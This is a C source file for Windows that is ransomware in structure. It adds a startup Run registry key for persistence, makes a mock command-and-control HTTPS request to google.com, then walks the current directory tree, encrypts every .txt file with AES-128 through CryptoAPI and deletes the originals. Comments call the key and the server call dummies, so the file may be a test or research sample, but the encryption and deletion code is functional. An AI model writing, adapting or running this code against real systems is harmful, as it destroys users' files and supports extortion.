#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <winhttp.h>
#include <strsafe.h>
#include <shlwapi.h>
#include <wincrypt.h>
#include <conio.h>

#pragma comment (lib, "advapi32")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "winhttp.lib")

#define KEYLENGTH  0x00800000
#define ENCRYPT_ALGORITHM CALG_AES_128
#define ENCRYPT_BLOCK_SIZE 16

void add_registry_key();
void generate_key();
void query_command_and_control_server();
void fatal(char *error);
void traverse_current_directory();
void traversal(TCHAR *p_dir, TCHAR *p_dir_s, int tabs);
void encrypt_file(TCHAR *source_dir, TCHAR *file_name);
void error(LPTSTR psz, int error);


int main(int argc, char *argv[]) {
	add_registry_key();
	generate_key();
	query_command_and_control_server();
	traverse_current_directory();
	return 0;
}


// adds program to startup for persistence
void add_registry_key() {

	TCHAR path[MAX_PATH] = _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\");
	TCHAR data[MAX_PATH] = _T("C:\\Program Files\\rblock\\t_aes.exe");
	HKEY run;
	
	printf("[+] Adding run key to registry\n");
	RegCreateKeyEx(HKEY_CURRENT_USER, path, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &run, NULL);
	RegSetValueEx(run, _T("t_aes.exe"), 0, REG_SZ, (BYTE *)data, _tcslen(data) * 2 + 1);
	RegCloseKey(run);
	_tprintf(_T("\tKey added to %s\n"), path);
	return;
}


// creates dummy key (not used in encryption, purely for system call execution)
void generate_key() {
	unsigned short key128[8];
	int i;

	printf("[+] Generating 128-bit encryption key\n");
	srand((unsigned int)time(NULL));
	printf("\tKey ");
	for (i = 0; i < 8; i++) {
		key128[i] = rand();
		printf("%04x", key128[i]);
	}
	printf("\n");
	return;
}


// a dummy call to a command and control server (calls google.com, purely for system call execution)
void query_command_and_control_server() {
	DWORD size;
	DWORD dl;
	BOOL status = FALSE;
	char out_buf[4096];
	HINTERNET h_session = NULL;
	HINTERNET h_connect = NULL;
	HINTERNET h_request = NULL;

	printf("[+] Querying command and control server\n");

	// open session
	h_session = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (!h_session) fatal("opening session");

	// specify server
	h_connect = WinHttpConnect(h_session, L"www.google.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
	if (!h_connect) fatal("connecting to server");

	// create request
	h_request = WinHttpOpenRequest(h_connect, L"GET", NULL, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
	if (!h_request) fatal("creating request");

	// send request
	status = WinHttpSendRequest(h_request, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	if (!status) fatal("sending request");

	// wait for response
	status = WinHttpReceiveResponse(h_request, NULL);
	if (!status) fatal("getting response");

	do {
		// get data
		size = 0;
		if (!WinHttpQueryDataAvailable(h_request, &size)) fatal("getting data");

		// read data
		memset(out_buf, 0, sizeof(out_buf));
		if (!WinHttpReadData(h_request, (LPVOID)out_buf, size, &dl)) fatal("reading data");

	} while (size > 0);
	printf("\tReceived valid response\n");
	return;
}


// error handler for query_command_and_control_server
void fatal(char *error) {
	printf("Error: %s\n", error);
	getchar();
	exit(1);
}


// initiates traversal of current directory
void traverse_current_directory() {
	TCHAR dir[MAX_PATH];
	TCHAR dir_s[MAX_PATH];

	printf("[+] Beginning directory traversal\n");
	GetCurrentDirectory(MAX_PATH, dir);
	StringCchCopy(dir_s, MAX_PATH, dir);
	StringCchCat(dir_s, MAX_PATH, TEXT("\\*"));
	traversal(dir, dir_s, 0);
	printf("[+] Directory traversal finished, all .txt files encrypted\n");
	getchar();
	return;
}


// recursively traverses directories searching for .txt files
void traversal(TCHAR *p_dir, TCHAR *p_dir_s, int tabs) {

	TCHAR dir[MAX_PATH];
	TCHAR dir_s[MAX_PATH];
	TCHAR n_dir[MAX_PATH];
	TCHAR n_dir_s[MAX_PATH];
	HANDLE h_file;
	WIN32_FIND_DATA ffd;

	StringCchCopy(dir, MAX_PATH, p_dir);
	StringCchCopy(dir_s, MAX_PATH, p_dir_s);
	h_file = FindFirstFile(dir_s, &ffd);
	do {
		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			// directory traversal
			if (_tcscmp(ffd.cFileName, _T(".")) != 0 && _tcscmp(ffd.cFileName, _T("..")) != 0) {
				StringCchCopy(n_dir, MAX_PATH, dir);
				StringCchCat(n_dir, MAX_PATH, _T("\\"));
				StringCchCat(n_dir, MAX_PATH, ffd.cFileName);
				StringCchCopy(n_dir_s, MAX_PATH, n_dir);
				StringCchCat(n_dir_s, MAX_PATH, _T("\\*"));
				traversal(n_dir, n_dir_s, (tabs + 1));
			}
		}
		// file extension check
		else {
			_tprintf(_T("[+] File found %s\n"), ffd.cFileName);
			StringCchCopy(n_dir, MAX_PATH, dir);
			StringCchCat(n_dir, MAX_PATH, _T("\\"));
			StringCchCat(n_dir, MAX_PATH, ffd.cFileName);
			TCHAR *ext = (TCHAR *)PathFindExtension(n_dir);
			// check for .txt files
			if (_tcscmp(ext, _T(".txt")) == 0) {
				_tprintf(_T("\tExtension %s, NOT OK\n"), ext);
				// encrypt file
				encrypt_file(dir, ffd.cFileName);
				// delete file
				DeleteFile(n_dir);
				printf("\tOriginal file deleted\n");
			}
			else _tprintf(_T("\tExtension %s, OK\n"), ext);
		}
	} while (FindNextFile(h_file, &ffd) != 0);
	FindClose(h_file);
	return;
}


// encrypts specified file using AES-128
void encrypt_file(TCHAR *source_dir, TCHAR *file_name) {

	TCHAR source[MAX_PATH];
	TCHAR destination[MAX_PATH];
	LPTSTR pszSource = NULL;
	LPTSTR pszDestination = NULL;
	bool fReturn = false;
	HANDLE hSourceFile = INVALID_HANDLE_VALUE;
	HANDLE hDestinationFile = INVALID_HANDLE_VALUE;
	HCRYPTPROV hCryptProv = NULL;
	HCRYPTKEY hKey = NULL;
	HCRYPTKEY hXchgKey = NULL;
	PBYTE pbKeyBlob = NULL;
	DWORD dwKeyBlobLen;
	PBYTE pbBuffer = NULL;
	DWORD dwBlockLen;
	DWORD dwBufferLen;
	DWORD dwCount;

	printf("\tEncrypting file\n");
	StringCchCopy(source, MAX_PATH, source_dir);
	StringCchCat(source, MAX_PATH, _T("\\"));
	StringCchCat(source, MAX_PATH, file_name);
	StringCchCopy(destination, MAX_PATH, source_dir);
	StringCchCat(destination, MAX_PATH, _T("\\"));
	StringCchCat(destination, MAX_PATH, file_name);
	StringCchCat(destination, MAX_PATH, _T(".aes"));
	pszSource = source;
	pszDestination = destination;

	// open source file
	hSourceFile = CreateFile(pszSource, FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hSourceFile == INVALID_HANDLE_VALUE) {
		error(_T("opening source file"), GetLastError());
		goto exit;
	}

	// open destination file 
	hDestinationFile = CreateFile(pszDestination, FILE_WRITE_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDestinationFile == INVALID_HANDLE_VALUE) {
		error(_T("opening destination file"), GetLastError());
		goto exit;
	}

	// get handle to default provider
	if (!CryptAcquireContext(&hCryptProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		error(_T("getting provider handle"), GetLastError());
		goto exit;
	}

	// create random session key
	if (!CryptGenKey(hCryptProv, ENCRYPT_ALGORITHM, KEYLENGTH | CRYPT_EXPORTABLE, &hKey)) {
		error(_T("creating session key"), GetLastError());
		goto exit;
	}

	// get handle to exchange public key
	if (!CryptGetUserKey(hCryptProv, AT_KEYEXCHANGE, &hXchgKey)) {
		if (NTE_NO_KEY == GetLastError()) {
			// no exchange key exists, create one
			if (!CryptGenKey(hCryptProv, AT_KEYEXCHANGE, CRYPT_EXPORTABLE, &hXchgKey)) {
				error(_T("creating user public key"), GetLastError());
				goto exit;
			}
		}
		else {
			error(_T("user public key not available"), GetLastError());
			goto exit;
		}
	}

	// determine size of key BLOB, allocate memory 
	if (!CryptExportKey(hKey, hXchgKey, SIMPLEBLOB, 0, NULL, &dwKeyBlobLen)) {
		error(_T("computing BLOB length"), GetLastError());
		goto exit;
	}

	// allocate memory
	if (!(pbKeyBlob = (BYTE *)malloc(dwKeyBlobLen))) {
		error(_T("not enough memory"), E_OUTOFMEMORY);
		goto exit;
	}

	// encrypt and export session key
	if (!CryptExportKey(hKey, hXchgKey, SIMPLEBLOB, 0, pbKeyBlob, &dwKeyBlobLen)) {
		error(_T("exporting session key"), GetLastError());
		goto exit;
	}

	// release key exchange key handle
	if (hXchgKey) {
		if (!(CryptDestroyKey(hXchgKey))) {
			error(_T("releasing key exchange key handle"), GetLastError());
			goto exit;
		}
		hXchgKey = 0;
	}

	// write size of key BLOB to destination file 
	if (!WriteFile(hDestinationFile, &dwKeyBlobLen, sizeof(DWORD), &dwCount, NULL)) {
		error(_T("writing size of header"), GetLastError());
		goto exit;
	}

	// write key BLOB to destination file  
	if (!WriteFile(hDestinationFile, pbKeyBlob, dwKeyBlobLen, &dwCount, NULL)) {
		error(_T("writing header"), GetLastError());
		goto exit;
	}

	// free memory
	free(pbKeyBlob);

	// determine block size
	dwBlockLen = 1000 - 1000 % ENCRYPT_BLOCK_SIZE;
	if (ENCRYPT_BLOCK_SIZE > 1) dwBufferLen = dwBlockLen + ENCRYPT_BLOCK_SIZE;
	else dwBufferLen = dwBlockLen;

	// allocate memory
	if (!(pbBuffer = (BYTE *)malloc(dwBufferLen))) {
		error(_T("out of memory"), E_OUTOFMEMORY);
		goto exit;
	}

	// encrypt file
	bool fEOF = FALSE;
	do {
		// read up to dwBlockLen bytes from source file
		if (!ReadFile(hSourceFile, pbBuffer, dwBlockLen, &dwCount, NULL)) {
			error(_T("reading plaintext"), GetLastError());
			goto exit;
		}

		// encrypt data
		if (dwCount < dwBlockLen) fEOF = TRUE;
		if (!CryptEncrypt(hKey, NULL, fEOF, 0, pbBuffer, &dwCount, dwBufferLen)) {
			error(_T("during encryption"), GetLastError());
			goto exit;
		}

		// write encrypted data to destination file
		if (!WriteFile(hDestinationFile, pbBuffer, dwCount, &dwCount, NULL)) {
			error(_T("Error writing ciphertext.\n"), GetLastError());
			goto exit;
		}
	} while (!fEOF);

	printf("\tEncrypted successfully\n");
	fReturn = true;

exit:
	// close files
	if (hSourceFile) CloseHandle(hSourceFile);
	if (hDestinationFile) CloseHandle(hDestinationFile);

	// free memory
	if (pbBuffer) free(pbBuffer);

	// release session key
	if (hKey) {
		if (!(CryptDestroyKey(hKey))) error(_T("destroying session key"), GetLastError());
	}

	// release provider handle
	if (hCryptProv) {
		if (!(CryptReleaseContext(hCryptProv, 0))) error(_T("releasing provider handle"), GetLastError());
	}

	return;
}


// error handler for encrypt_file
void error(LPTSTR psz, int error) {
	_tprintf(_T("Error: %s, code %x\n"), psz, error);
}